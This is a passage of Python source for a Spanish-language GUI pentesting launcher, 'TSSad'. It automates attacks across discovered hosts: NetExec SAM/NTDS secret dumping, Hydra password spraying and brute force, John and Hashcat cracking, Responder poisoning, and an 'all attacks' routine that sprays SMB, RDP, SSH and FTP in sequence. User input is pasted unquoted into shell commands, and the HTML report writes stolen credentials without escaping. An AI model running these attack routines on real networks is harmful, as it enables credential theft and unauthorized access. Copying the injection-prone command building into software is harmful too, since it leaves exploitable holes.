            self.log(f"⚠️ Limitando a 5 hosts para dump secrets")
            hosts_str = ' '.join(selected_hosts)
        else:
            hosts_str = ' '.join(self.discovered_hosts)
        
        cmd = f"netexec {protocol} {hosts_str} -u {user} -p {password} --sam --ntds --shares"
        
        terminal_cmd = self.get_terminal_command(cmd)
        self.run_command_in_thread(terminal_cmd, f"NetExec-{protocol}-DumpSecrets")
    
    # ===== MÉTODOS HYDRA =====
    
    def hydra_password_spray(self):
        """Hydra Password Spray"""
        if not self.discovered_hosts:
            messagebox.showerror("Error", "No hay hosts disponibles")
            return
        
        protocol = self.hydra_protocol.get()
        port = self.hydra_port.get().strip()
        password = self.netexec_password.get().strip()  # Reutilizar campo de contraseña
        
        if not password:
            messagebox.showerror("Error", "Introduce una contraseña en el campo NetExec")
            return
        
        if not self.valid_users:
            messagebox.showerror("Error", "No hay usuarios válidos disponibles")
            return
        
        self.log(f"🌊 HYDRA PASSWORD SPRAY - {protocol.upper()}")
        
        for host in self.discovered_hosts:
            cmd = f"hydra -L {self.valid_users_file} -p {password} -s {port} -t 10 -w 3 {host} {protocol}"
            terminal_cmd = self.get_terminal_command(cmd)
            self.run_command_in_thread(terminal_cmd, f"Hydra-{protocol}-{host}")
    
    def hydra_dictionary_attack(self):
        """Hydra Dictionary Attack"""
        if not self.discovered_hosts:
            messagebox.showerror("Error", "No hay hosts disponibles")
            return
        
        protocol = self.hydra_protocol.get()
        port = self.hydra_port.get().strip()
        user = self.netexec_user.get().strip()  # Reutilizar campo de usuario
        
        if not user:
            messagebox.showerror("Error", "Introduce un usuario en el campo NetExec")
            return
        
        # Pedir diccionario
        password_file = filedialog.askopenfilename(
            title="Selecciona diccionario de contraseñas",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        if not password_file:
            return
        
        self.log(f"🔨 HYDRA DICTIONARY ATTACK - {protocol.upper()}")
        
        for host in self.discovered_hosts:
            cmd = f"hydra -l {user} -P {password_file} -s {port} -t 10 -w 3 {host} {protocol}"
            terminal_cmd = self.get_terminal_command(cmd)
            self.run_command_in_thread(terminal_cmd, f"Hydra-Dict-{protocol}-{host}")
    
    def hydra_combo_attack(self):
        """Hydra Combo Attack (usuarios y contraseñas)"""
        if not self.discovered_hosts:
            messagebox.showerror("Error", "No hay hosts disponibles")
            return
        
        protocol = self.hydra_protocol.get()
        port = self.hydra_port.get().strip()
        
        # Pedir archivos
        user_file = filedialog.askopenfilename(title="Selecciona archivo de usuarios",
                                              filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
        if not user_file:
            return
        
        password_file = filedialog.askopenfilename(title="Selecciona diccionario de contraseñas",
                                                  filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
        if not password_file:
            return
        
        self.log(f"🎯 HYDRA COMBO ATTACK - {protocol.upper()}")
        
        for host in self.discovered_hosts:
            cmd = f"hydra -L {user_file} -P {password_file} -s {port} -t 10 -w 3 {host} {protocol}"
            terminal_cmd = self.get_terminal_command(cmd)
            self.run_command_in_thread(terminal_cmd, f"Hydra-Combo-{protocol}-{host}")
    
    # ===== OTRAS HERRAMIENTAS =====
    
    def start_john_ripper(self):
        """Inicia John the Ripper"""
        hash_file = filedialog.askopenfilename(
            title="Selecciona archivo de hashes",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        if not hash_file:
            return
        
        self.log("🔓 INICIANDO JOHN THE RIPPER")
        
        cmd = f"john --wordlist=/usr/share/wordlists/rockyou.txt {hash_file}"
        terminal_cmd = self.get_terminal_command(cmd)
        self.run_command_in_thread(terminal_cmd, "John the Ripper")
    
    def start_hashcat(self):
        """Inicia Hashcat"""
        hash_file = filedialog.askopenfilename(
            title="Selecciona archivo de hashes",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        if not hash_file:
            return
        
        # Pedir tipo de hash
        hash_type = simpledialog.askstring("Hashcat", "Introduce el tipo de hash (ej: 1000 para NTLM):")
        if not hash_type:
            return
        
        self.log("⚡ INICIANDO HASHCAT")
        
        cmd = f"hashcat -m {hash_type} -a 0 {hash_file} /usr/share/wordlists/rockyou.txt"
        terminal_cmd = self.get_terminal_command(cmd)
        self.run_command_in_thread(terminal_cmd, "Hashcat")
    
    # ===== ATAQUES AUTOMATIZADOS =====
    
    def start_all_attacks(self):
        """Ejecuta todos los tipos de ataques automáticamente"""
        if not messagebox.askyesno("Confirmación", "⚠️ Esto ejecutará TODOS los ataques disponibles.\n¿Estás seguro?"):
            return
        
        password = simpledialog.askstring("Password Spray", "Introduce contraseña para spray automático:", show='*')
        if not password:
            return
        
        self.log("⚔️ INICIANDO TODOS LOS ATAQUES AUTOMÁTICAMENTE")
        
        # Ejecutar en secuencia
        def run_all_attacks():
            try:
                # 1. Kerbrute Password Spray
                if self.valid_users:
                    self.password_entry.delete(0, tk.END)
                    self.password_entry.insert(0, password)
                    self.start_password_spray()
                    self.root.after(5000, lambda: None)  # Pausa no bloqueante
                
                # 2. NetExec SMB
                self.root.after(100, lambda: self.netexec_protocol.set("smb"))
                self.root.after(200, lambda: self.netexec_password.delete(0, tk.END))
                self.root.after(300, lambda: self.netexec_password.insert(0, password))
                self.root.after(400, lambda: self.netexec_password_spray())
                
                # 3. NetExec RDP
                self.root.after(5500, lambda: self.netexec_protocol.set("rdp"))
                self.root.after(5600, lambda: self.netexec_password_spray())
                
                # 4. Hydra SSH
                self.root.after(10000, lambda: self.hydra_protocol.set("ssh"))
                self.root.after(10100, lambda: self.hydra_password_spray())
                
                self.log("✅ TODOS LOS ATAQUES COMPLETADOS")
                
            except Exception as e:
                self.log(f"❌ Error en ataques automáticos: {str(e)}")
        
        # Ejecutar en hilo separado
        thread = threading.Thread(target=run_all_attacks, daemon=True)
        thread.start()
    
    def auto_password_spray_all(self):
        """Password spray automático en todos los protocolos"""
        password = simpledialog.askstring("Auto Password Spray", "Introduce contraseña:", show='*')
        if not password:
            return
        
        if not self.valid_users:
            messagebox.showerror("Error", "No hay usuarios válidos")
            return
        
        self.log("💥 AUTO PASSWORD SPRAY EN TODOS LOS PROTOCOLOS")
        
        protocols = ["smb", "rdp", "ssh", "ftp"]
        
        def run_auto_spray():
            for protocol in protocols:
                try:
                    self.log(f"🎯 Probando {protocol.upper()}")
                    
                    # NetExec
                    self.netexec_protocol.set(protocol)
                    self.netexec_password.delete(0, tk.END)
                    self.netexec_password.insert(0, password)
                    self.netexec_password_spray()
                    
                    time.sleep(3)
                    
                    # Hydra (solo para protocolos compatibles)
                    if protocol in ["ssh", "ftp"]:
                        self.hydra_protocol.set(protocol)
                        self.hydra_password_spray()
                        time.sleep(3)
                        
                except Exception as e:
                    self.log(f"❌ Error en {protocol}: {str(e)}")
        
        thread = threading.Thread(target=run_auto_spray, daemon=True)
        thread.start()
    
    def test_found_credentials(self):
        """Prueba todas las credenciales encontradas en todos los servicios"""
        credentials_file = "valid_credentials.txt"
        if not os.path.exists(credentials_file):
            messagebox.showerror("Error", "No hay credenciales encontradas")
            return
        
        self.log("🔑 PROBANDO TODAS LAS CREDENCIALES ENCONTRADAS")
        
        protocols = ["smb", "rdp", "ssh", "ftp"]
        
        def test_all_creds():
            for protocol in protocols:
                self.log(f"🔓 Probando credenciales en {protocol.upper()}")
                self.netexec_protocol.set(protocol)
                self.netexec_test_credentials()
                time.sleep(5)
        
        thread = threading.Thread(target=test_all_creds, daemon=True)
        thread.start()

    def start_netexec_attacks(self):
        """Método legacy - redirige a NetExec password spray"""
        messagebox.showinfo("NetExec", "Usa los botones específicos de NetExec en la sección correspondiente")

    def log(self, message):
        """Añade un mensaje al log con autoscroll"""
        timestamp = datetime.datetime.now().strftime("%H:%M:%S")
        log_entry = f"[{timestamp}] {message}"
        
        # Insertar en el hilo principal de la GUI
        def update_log():
            self.log_text.insert(tk.END, log_entry + "\n")
            self.log_text.see(tk.END)
            self.log_text.update_idletasks()
        
        # Si estamos en el hilo principal, actualizar directamente
        try:
            self.root.after(0, update_log)
        except:
            # Fallback para casos donde no podemos usar after
            self.log_text.insert(tk.END, log_entry + "\n")
            self.log_text.see(tk.END)
        
        # Guardar en datos de log
        self.log_data.append({
            'timestamp': timestamp,
            'message': message
        })
    
    def execute_command(self):
        """Ejecuta el comando seleccionado"""
        current_tab = self.notebook.tab(self.notebook.select(), "text")
        self.log(f"Ejecutando función de: {current_tab}")
        
        # Aquí se podría implementar lógica específica por pestaña
        messagebox.showinfo("Ejecutar", f"Ejecutando función de {current_tab}")
    
    def stop_execution(self):
        """Para todos los procesos en ejecución"""
        if not self.running_processes:
            self.log("ℹ️ No hay procesos ejecutándose")
            messagebox.showinfo("Parar", "No hay procesos en ejecución")
            return
        
        process_count = len(self.running_processes)
        self.log(f"🛑 DETENIENDO {process_count} PROCESO(S)...")
        
        for process in self.running_processes:
            try:
                process.terminate()
                self.log(f"  → Proceso terminado: PID {process.pid}")
            except:
                pass
        
        self.running_processes.clear()
        self.log("✅ Todos los procesos han sido detenidos")
        messagebox.showinfo("Procesos Detenidos", f"✅ {process_count} proceso(s) detenido(s) correctamente")
    
    def clear_logs(self):
        """Limpia los logs de la pantalla"""
        if messagebox.askyesno("Limpiar Logs", "¿Estás seguro de que quieres limpiar todos los logs de la pantalla?"):
            self.log_text.delete(1.0, tk.END)
            self.log("🧹 TSSad (by jukathaido) - Logs limpiados")
            self.log("="*60)
    
    def generate_html_report(self):
        """Genera un informe HTML con todos los resultados"""
        html_content = self.create_html_report()
        
        # Guardar archivo HTML
        filename = f"tssad_report_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
        
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(html_content)
            
            self.log(f"Informe HTML generado: {filename}")
            
            # Preguntar si abrir en navegador
            if messagebox.askyesno("Informe Generado", 
                                  f"Informe guardado como {filename}\n¿Abrir en navegador?"):
                webbrowser.open(f"file://{os.path.abspath(filename)}")
                
        except Exception as e:
            self.log(f"Error generando informe: {str(e)}")
            messagebox.showerror("Error", f"Error generando informe: {str(e)}")
    
    def create_html_report(self):
        """Crea el contenido HTML del informe"""
        html = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>TSSad (by jukathaido) - Informe</title>
            <meta charset="utf-8">
            <style>
                body {{ font-family: Arial, sans-serif; margin: 20px; background-color: #f5f5f5; }}
                .header {{ background-color: #2b2b2b; color: #00ff00; padding: 20px; text-align: center; }}
                .section {{ background-color: white; margin: 20px 0; padding: 20px; border-radius: 5px; }}
                .log-entry {{ font-family: Courier; font-size: 12px; margin: 2px 0; }}
                .warning {{ color: red; font-weight: bold; text-align: center; margin: 20px 0; }}
                table {{ width: 100%; border-collapse: collapse; }}
                th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
                th {{ background-color: #f2f2f2; }}
            </style>
        </head>
        <body>
            <div class="header">
                <h1>TSSad (by jukathaido) - Informe de Resultados</h1>
                <p>Generado el: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
            </div>
            
            <div class="warning">
                ⚠️ ESTE INFORME CONTIENE INFORMACIÓN SENSIBLE DE SEGURIDAD ⚠️
            </div>
            
            <div class="section">
                <h2>Resumen de Actividades</h2>
                <p>Total de entradas de log: {len(self.log_data)}</p>
                <p>Resultados de escaneos: {len(self.scan_results)}</p>
                <p>Hosts descubiertos: {len(self.discovered_hosts)}</p>
                <p>Usuarios válidos: {len(self.valid_users)}</p>
            </div>
            
            <div class="section">
                <h2>Hosts Descubiertos</h2>
        """
        
        if self.discovered_hosts:
            html += "<ul>"
            for host in self.discovered_hosts:
                html += f"<li>{host}</li>"
            html += "</ul>"
        else:
            html += "<p>No hay hosts descubiertos.</p>"
        
        html += """
            </div>
            
            <div class="section">
                <h2>Usuarios Válidos Encontrados</h2>
        """
        
        if self.valid_users:
            html += "<ul>"
            for user in self.valid_users:
                html += f"<li>{user}</li>"
            html += "</ul>"
        else:
            html += "<p>No hay usuarios válidos encontrados.</p>"
        
        html += """
            </div>
            
            <div class="section">
                <h2>Vulnerabilidades Encontradas</h2>
        """
        
        # Leer vulnerabilidades si existen
        vulnerabilities_file = "discovered_vulnerabilities.txt"
        if os.path.exists(vulnerabilities_file):
            try:
                with open(vulnerabilities_file, 'r', encoding='utf-8') as f:
                    vuln_content = f.read()
                    if vuln_content.strip():
                        html += f"<pre style='background-color: #f8f8f8; padding: 10px; border-radius: 5px;'>{vuln_content}</pre>"
                    else:
                        html += "<p>No se encontraron vulnerabilidades específicas.</p>"
            except Exception as e:
                html += f"<p>Error leyendo vulnerabilidades: {str(e)}</p>"
        else:
            html += "<p>No se han ejecutado escaneos de vulnerabilidades.</p>"
        
        html += """
            </div>
            
            <div class="section">
                <h2>Credenciales Válidas Encontradas</h2>
        """
        
        # Leer credenciales si existen
        credentials_file = "valid_credentials.txt"
        if os.path.exists(credentials_file):
            try:
                with open(credentials_file, 'r', encoding='utf-8') as f:
                    cred_content = f.read()
                    if cred_content.strip():
                        html += f"<pre style='background-color: #ffe6e6; padding: 10px; border-radius: 5px; color: #cc0000;'>{cred_content}</pre>"
                    else:
                        html += "<p>No se encontraron credenciales válidas.</p>"
            except Exception as e:
                html += f"<p>Error leyendo credenciales: {str(e)}</p>"
        else:
            html += "<p>No se han ejecutado ataques de credenciales.</p>"
        
        html += """
            </div>
            
            <div class="section">
                <h2>Logs del Sistema</h2>
        """
        
        for entry in self.log_data:
            html += f'<div class="log-entry">[{entry["timestamp"]}] {entry["message"]}</div>\n'
        
        html += """
            </div>
            
            <div class="section">
                <h2>Resultados de Escaneos</h2>
        """
        
        if self.scan_results:
            for scan_type, results in self.scan_results.items():
                html += f"<h3>{scan_type}</h3>\n"
                html += f"<pre>{results}</pre>\n"
        else:
            html += "<p>No hay resultados de escaneos disponibles.</p>"
        
        html += """
            </div>
            
            <div class="warning">
                <p>Este informe debe ser tratado como información confidencial.</p>
                <p>Uso únicamente autorizado para pruebas de seguridad legítimas.</p>
            </div>
        </body>
        </html>
        """
        
        return html
    
    def exit_application(self):
        """Sale de la aplicación"""
        if messagebox.askyesno("Salir", "¿Estás seguro de que quieres salir?"):
            # Guardar datos antes de salir
            if self.discovered_hosts:
                self.save_targets_file()
            self.stop_execution()
            self.root.destroy()
    
    # Métodos específicos para cada herramienta
    def start_host_discovery(self):
        """Inicia el descubrimiento de hosts vivos con nmap -sn"""
        target = self.target_entry.get().strip()
        if not target:
            messagebox.showerror("Error", "Introduce un rango de red válido (ej: 192.168.1.0/24)")
            return
        
        # Comando nmap para descubrimiento de hosts
        cmd = ["nmap", "-sn", target]
        
        self.log(f"🔍 DESCUBRIMIENTO DE HOSTS INICIADO")
        self.log(f"Objetivo: {target}")
        
        # Ejecutar en hilo separado con callback especial
        def discovery_callback(output):
            hosts = self.parse_host_discovery(output)
            if hosts:
                self.discovered_hosts = hosts
                self.save_hosts_to_file(hosts)
                self.save_targets_file()  # Guardar también en archivo de objetivos
                self.update_hosts_file_status(True)
                self.log(f"🎯 ¡DESCUBIERTOS {len(hosts)} HOSTS VIVOS!")
                self.log(f"📄 Hosts guardados en: {self.hosts_file}")
                # Mostrar hosts encontrados
                for host in hosts:
                    self.log(f"   → {host}")
                # Actualizar estado en pestaña de ataques
                self.update_attack_status()
            else:
                self.log("❌ No se encontraron hosts vivos")
                self.update_hosts_file_status(False)
        
        self.run_command_with_callback(cmd, "Descubrimiento de Hosts", discovery_callback)
    
    def start_detailed_scan(self):
        """Inicia escaneo detallado de hosts previamente descubiertos"""
        if not os.path.exists(self.hosts_file) or not self.discovered_hosts:
            messagebox.showerror("Error", "Primero debes descubrir hosts vivos")
            return
        
        # Construir comando nmap para escaneo detallado
        cmd = ["nmap"]
        
        # Opciones seleccionadas
        selected_options = []
        for opt, var in self.nmap_options.items():
            if var.get():
                cmd.append(opt)
                selected_options.append(opt)
        
        # Opciones por defecto para escaneo detallado
        cmd.extend(["-p-", "--open", "-vvv"])
        
        # Usar archivo de hosts como input
        cmd.extend(["-iL", self.hosts_file])
        
        # Guardar resultados
        output_file = f"detailed_scan_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.xml"
        cmd.extend(["-oX", output_file])
        
        self.log(f"🔬 ESCANEO DETALLADO INICIADO")
        self.log(f"Hosts objetivo: {len(self.discovered_hosts)}")
        self.log(f"Opciones: {', '.join(selected_options) if selected_options else 'Ninguna adicional'}")
        self.log(f"Archivo de salida: {output_file}")
        
        self.run_command_in_thread(cmd, "Escaneo Detallado")
    
    def parse_host_discovery(self, nmap_output):
        """Extrae las IPs de hosts vivos del output de nmap -sn"""
        hosts = []
        
        for line in nmap_output.split('\n'):
            line = line.strip()
            
            # Buscar líneas que contengan "Nmap scan report for"
            if "Nmap scan report for" in line:
                # Extraer IP - puede estar en formato "IP" o "hostname (IP)"
                if "(" in line and ")" in line:
                    # Formato: Nmap scan report for hostname (192.168.1.1)
                    ip = line.split("(")[1].split(")")[0]
                else:
                    # Formato: Nmap scan report for 192.168.1.1
                    parts = line.split()
                    if len(parts) >= 5:
                        ip = parts[4]
                    else:
                        continue
                
                # Validar que sea una IP válida
                if self.is_valid_ip(ip):
                    hosts.append(ip)
        
        return hosts
    
    def is_valid_ip(self, ip):
        """Valida si una cadena es una IP válida"""
        parts = ip.split('.')
        if len(parts) != 4:
            return False
        
        try:
            for part in parts:
                num = int(part)
                if num < 0 or num > 255:
                    return False
            return True
        except ValueError:
            return False
    
    def save_hosts_to_file(self, hosts):
        """Guarda la lista de hosts en un archivo"""
        try:
            with open(self.hosts_file, 'w') as f:
                for host in hosts:
                    f.write(f"{host}\n")
            
            self.log(f"Hosts guardados en {self.hosts_file}:")
            for host in hosts:
                self.log(f"  -> {host}")
                
        except Exception as e:
            self.log(f"Error guardando hosts: {str(e)}")
    
    def update_hosts_file_status(self, exists):
        """Actualiza el estado del archivo de hosts en la interfaz"""
        if exists:
            self.hosts_file_label.config(text=f"Archivo de hosts: {self.hosts_file} ({len(self.discovered_hosts)} hosts)", 
                                        fg='green')
            # Actualizar también el estado en la pestaña de vulnerabilidades
            if hasattr(self, 'vuln_hosts_status'):
                self.vuln_hosts_status.config(text=f"✓ {len(self.discovered_hosts)} hosts listos para escanear", fg='green')
        else:
            self.hosts_file_label.config(text="Archivo de hosts: No generado", fg='red')
            if hasattr(self, 'vuln_hosts_status'):
                self.vuln_hosts_status.config(text="Esperando hosts descubiertos...", fg='orange')
    
    def view_discovered_hosts(self):
        """Muestra los hosts descubiertos en una ventana"""
        if not self.discovered_hosts:
            messagebox.showinfo("Hosts Descubiertos", "No hay hosts descubiertos aún.\nEjecuta primero el descubrimiento de hosts.")
            return
        
        # Crear ventana para mostrar hosts
        hosts_window = tk.Toplevel(self.root)
        hosts_window.title("Hosts Descubiertos")
        hosts_window.geometry("400x500")
        hosts_window.configure(bg='#2b2b2b')
        
        # Título
        title_label = tk.Label(hosts_window, text=f"Hosts Vivos Encontrados ({len(self.discovered_hosts)})", 
                              font=('Arial', 12, 'bold'), fg='#00ff00', bg='#2b2b2b')
        title_label.pack(pady=10)
        
        # Lista de hosts
        hosts_text = scrolledtext.ScrolledText(hosts_window, height=20, width=50,
                                              bg='black', fg='#00ff00', font=('Courier', 10))
        hosts_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        for i, host in enumerate(self.discovered_hosts, 1):
            hosts_text.insert(tk.END, f"{i:2d}. {host}\n")
        
        hosts_text.config(state=tk.DISABLED)
        
        # Botón cerrar
        close_btn = tk.Button(hosts_window, text="Cerrar", command=hosts_window.destroy,
                             bg='#ff3333', fg='white', font=('Arial', 10, 'bold'))
        close_btn.pack(pady=10)
    
    def run_command_with_callback(self, cmd, scan_type, callback):
        """Ejecuta un comando con callback personalizado para procesar resultados"""
        def run():
            try:
                self.log(f"🚀 INICIANDO: {scan_type}")
                self.log(f"Comando: {' '.join(cmd)}")
                self.log("-" * 50)
                
                process = subprocess.Popen(cmd, stdout=subprocess.PIPE, 
                                         stderr=subprocess.STDOUT, text=True, 
                                         universal_newlines=True, bufsize=1)
                self.running_processes.append(process)
                
                output_lines = []
                
                # Leer output línea por línea en tiempo real
                while True:
                    line = process.stdout.readline()
                    if line:
                        line = line.rstrip()
                        output_lines.append(line)
                        # Mostrar en tiempo real
                        self.log(f"  {line}")
                    
                    # Verificar si el proceso ha terminado
                    if process.poll() is not None:
                        break
                
                # Leer cualquier output restante
                remaining_output = process.stdout.read()
                if remaining_output:
                    for line in remaining_output.split('\n'):
                        if line.strip():
                            output_lines.append(line.strip())
                            self.log(f"  {line.strip()}")
                
                return_code = process.returncode
                full_output = '\n'.join(output_lines)
                
                self.log("-" * 50)
                if return_code == 0:
                    self.log(f"✅ COMPLETADO: {scan_type}")
                    self.show_completion_notification(scan_type, True)
                else:
                    self.log(f"❌ ERROR: {scan_type} (código: {return_code})")
                    self.show_completion_notification(scan_type, False)
                
                if full_output:
                    self.scan_results[scan_type] = full_output
                    if callback:
                        callback(full_output)
                        
            except Exception as e:
                self.log(f"💥 EXCEPCIÓN en {scan_type}: {str(e)}")
                self.show_completion_notification(scan_type, False, str(e))
            finally:
                if process in self.running_processes:
                    self.running_processes.remove(process)
        
        thread = threading.Thread(target=run)
        thread.daemon = True
        thread.start()
    
    def run_command_in_thread(self, cmd, scan_type, callback=None):
        """Ejecuta un comando en un hilo separado con output en tiempo real"""
        def run():
            try:
                self.log(f"🚀 INICIANDO: {scan_type}")
                self.log(f"Comando: {' '.join(cmd)}")
                self.log("-" * 50)
                
                process = subprocess.Popen(cmd, stdout=subprocess.PIPE, 
                                         stderr=subprocess.STDOUT, text=True, 
                                         universal_newlines=True, bufsize=1)
                self.running_processes.append(process)
                
                output_lines = []
                
                # Leer output línea por línea en tiempo real
                while True:
                    line = process.stdout.readline()
                    if line:
                        line = line.rstrip()
                        output_lines.append(line)
                        # Mostrar en tiempo real
                        self.log(f"  {line}")
                    
                    # Verificar si el proceso ha terminado
                    if process.poll() is not None:
                        break
                
                # Leer cualquier output restante
                remaining_output = process.stdout.read()
                if remaining_output:
                    for line in remaining_output.split('\n'):
                        if line.strip():
                            output_lines.append(line.strip())
                            self.log(f"  {line.strip()}")
                
                return_code = process.returncode
                full_output = '\n'.join(output_lines)
                
                self.log("-" * 50)
                if return_code == 0:
                    self.log(f"✅ COMPLETADO: {scan_type}")
                    self.show_completion_notification(scan_type, True)
                else:
                    self.log(f"❌ ERROR: {scan_type} (código: {return_code})")
                    self.show_completion_notification(scan_type, False)
                
                if full_output:
                    self.scan_results[scan_type] = full_output
                
                if callback:
                    callback()
                    
            except Exception as e:
                self.log(f"💥 EXCEPCIÓN en {scan_type}: {str(e)}")
                self.show_completion_notification(scan_type, False, str(e))
            finally:
                if process in self.running_processes:
                    self.running_processes.remove(process)
        
        thread = threading.Thread(target=run)
        thread.daemon = True
        thread.start()
    
    def show_completion_notification(self, scan_type, success, error_msg=None):
        """Muestra notificación de finalización"""
        def show_notification():
            if success:
                title = "✅ Proceso Completado"
                message = f"'{scan_type}' ha terminado exitosamente."
                messagebox.showinfo(title, message)
            else:
                title = "❌ Proceso Fallido"
                message = f"'{scan_type}' ha fallado."
                if error_msg:
                    message += f"\n\nError: {error_msg}"
                messagebox.showerror(title, message)
        
        # Ejecutar en el hilo principal de la GUI
        self.root.after(0, show_notification)
    
    def start_network_scan(self):
        """Método legacy - redirige al nuevo flujo"""
        self.start_host_discovery()
    
    def start_nmap_vuln_scan(self):
        """Inicia escaneo de vulnerabilidades con nmap en hosts descubiertos"""
        if not os.path.exists(self.hosts_file) or not self.discovered_hosts:
            messagebox.showerror("Error", "Primero debes descubrir hosts vivos en la pestaña 'Escaneo de Red'")
            return
        
        # Usar archivo de hosts descubiertos
        cmd = ["nmap", "--script", "vuln", "-vvv", "-iL", self.hosts_file]
        
        # Guardar resultados
        output_file = f"vuln_scan_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.xml"
        cmd.extend(["-oX", output_file])
        
        self.log(f"🛡️ ESCANEO DE VULNERABILIDADES INICIADO")
        self.log(f"Hosts objetivo: {len(self.discovered_hosts)}")
        self.log(f"Archivo de salida: {output_file}")
        
        # Callback para procesar vulnerabilidades
        def vuln_callback():
            self.parse_and_save_vulnerabilities(output_file)
        
        self.run_command_in_thread(cmd, "Escaneo de Vulnerabilidades", vuln_callback)
    
    def start_manual_vuln_scan(self):
        """Inicia escaneo de vulnerabilidades manual"""
        target = self.vuln_target_entry.get().strip()
        if not target:
            messagebox.showerror("Error", "Introduce un objetivo válido")
            return
        
        cmd = ["nmap", "--script", "vuln", "-vvv", target]
        
        # Guardar resultados
        output_file = f"manual_vuln_scan_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.xml"
        cmd.extend(["-oX", output_file])
        
        self.log(f"🛡️ ESCANEO MANUAL DE VULNERABILIDADES INICIADO")
        self.log(f"Objetivo: {target}")
        self.log(f"Archivo de salida: {output_file}")
        
        # Callback para procesar vulnerabilidades
        def vuln_callback():
            self.parse_and_save_vulnerabilities(output_file)
        
        self.run_command_in_thread(cmd, "Escaneo Manual de Vulnerabilidades", vuln_callback)
    
    def start_nessus(self):
        """Inicia Nessus"""
        self.log("🔥 INICIANDO SERVICIO NESSUS...")
        
        def start_nessus_service():
            try:
                # Verificar si ya está ejecutándose
                check_result = subprocess.run(["systemctl", "is-active", "nessusd"], 
                                            capture_output=True, text=True)
                
                if check_result.returncode == 0 and "active" in check_result.stdout:
                    self.log("ℹ️ Nessus ya está ejecutándose")
                    self.log("🌐 Ve a https://localhost:8834 en tu navegador")
                    messagebox.showinfo("Nessus", "ℹ️ Nessus ya está ejecutándose.\n\n🌐 Ve a https://localhost:8834 en tu navegador")
                    return
                
                # Iniciar el servicio
                result = subprocess.run(["sudo", "systemctl", "start", "nessusd"], 
                                      capture_output=True, text=True, timeout=30)
                
                if result.returncode == 0:
                    self.log("✅ Nessus iniciado exitosamente")
                    self.log("🌐 Ve a https://localhost:8834 en tu navegador")
                    self.log("⏳ El servicio puede tardar 1-2 minutos en estar completamente listo")
                    messagebox.showinfo("Nessus Iniciado", 
                                      "✅ Nessus ha sido iniciado correctamente.\n\n🌐 Ve a https://localhost:8834 en tu navegador\n\n⏳ El servicio puede tardar 1-2 minutos en cargar completamente.")
                else:
                    self.log(f"❌ Error iniciando Nessus: {result.stderr}")
                    messagebox.showerror("Error Nessus", f"❌ Error iniciando Nessus:\n{result.stderr}")
                    
            except subprocess.TimeoutExpired:
                self.log("⏳ Nessus está iniciando (proceso en segundo plano)")
                self.log("🌐 Ve a https://localhost:8834 en tu navegador en unos minutos")
                messagebox.showinfo("Nessus", "⏳ Nessus está iniciando en segundo plano.\n\n🌐 Ve a https://localhost:8834 en unos minutos")
            except Exception as e:
                self.log(f"💥 Error inesperado iniciando Nessus: {str(e)}")
                messagebox.showerror("Error", f"Error inesperado: {str(e)}")
        
        # Ejecutar en hilo separado para no bloquear la GUI
        thread = threading.Thread(target=start_nessus_service)
        thread.daemon = True
        thread.start()
    
    def stop_nessus(self):
        """Para Nessus"""
        self.log("🛑 DETENIENDO SERVICIO NESSUS...")
        
        def stop_nessus_service():
            try:
                # Verificar si está ejecutándose
                check_result = subprocess.run(["systemctl", "is-active", "nessusd"], 
                                            capture_output=True, text=True)
                
                if check_result.returncode != 0 or "inactive" in check_result.stdout:
                    self.log("ℹ️ Nessus ya está detenido")
                    messagebox.showinfo("Nessus", "ℹ️ Nessus ya está detenido.")
                    return
                
                # Detener el servicio
                result = subprocess.run(["sudo", "systemctl", "stop", "nessusd"], 
                                      capture_output=True, text=True, timeout=30)
                
                if result.returncode == 0:
                    self.log("✅ Nessus detenido exitosamente")
                    messagebox.showinfo("Nessus Detenido", "✅ Nessus ha sido detenido correctamente.")
                else:
                    self.log(f"❌ Error deteniendo Nessus: {result.stderr}")
                    messagebox.showerror("Error Nessus", f"❌ Error deteniendo Nessus:\n{result.stderr}")
                    
            except subprocess.TimeoutExpired:
                self.log("⏳ Nessus está deteniéndose...")
                messagebox.showinfo("Nessus", "⏳ Nessus está deteniéndose...")
            except Exception as e:
                self.log(f"💥 Error inesperado deteniendo Nessus: {str(e)}")
                messagebox.showerror("Error", f"Error inesperado: {str(e)}")
        
        # Ejecutar en hilo separado
        thread = threading.Thread(target=stop_nessus_service)
        thread.daemon = True
        thread.start()
    
    def check_nessus_status(self):
        """Verifica el estado de Nessus"""
        try:
            result = subprocess.run(["systemctl", "is-active", "nessusd"], 
                                  capture_output=True, text=True)
            
            if result.returncode == 0 and "active" in result.stdout:
                return "🟢 Activo"
            else:
                return "🔴 Inactivo"
        except:
            return "❓ Desconocido"
    
    def update_nessus_status(self):
        """Actualiza el estado visual de Nessus"""
        def update_status():
            status = self.check_nessus_status()
            if hasattr(self, 'nessus_status_label'):
                self.nessus_status_label.config(text=f"Estado: {status}")
                
                # Cambiar color según estado
                if "🟢" in status:
                    self.nessus_status_label.config(fg='green')
                elif "🔴" in status:
                    self.nessus_status_label.config(fg='red')
                else:
                    self.nessus_status_label.config(fg='orange')
        
        # Ejecutar en hilo separado para no bloquear GUI
        thread = threading.Thread(target=update_status)
        thread.daemon = True
        thread.start()
    
    def start_responder(self):
        """Inicia Responder"""
        interface = self.interface_entry.get().strip()
        if not interface:
            messagebox.showerror("Error", "Introduce una interfaz válida")
            return
        
        cmd = f"responder -I {interface} wrf"
        self.log(f"🎭 INICIANDO RESPONDER en interfaz {interface}")
        
        # Usar terminal compatible con Kali Linux
        terminal_cmd = self.get_terminal_command(cmd)
        self.run_command_in_thread(terminal_cmd, "Responder")
    
    def start_kerbrute(self):
        """Inicia Kerbrute"""
        domain = self.domain_entry.get().strip()
        dc = self.dc_entry.get().strip()
        
        if not domain or not dc:
            messagebox.showerror("Error", "Introduce dominio y controlador de dominio")
            return
        
        # Verificar si kerbrute existe
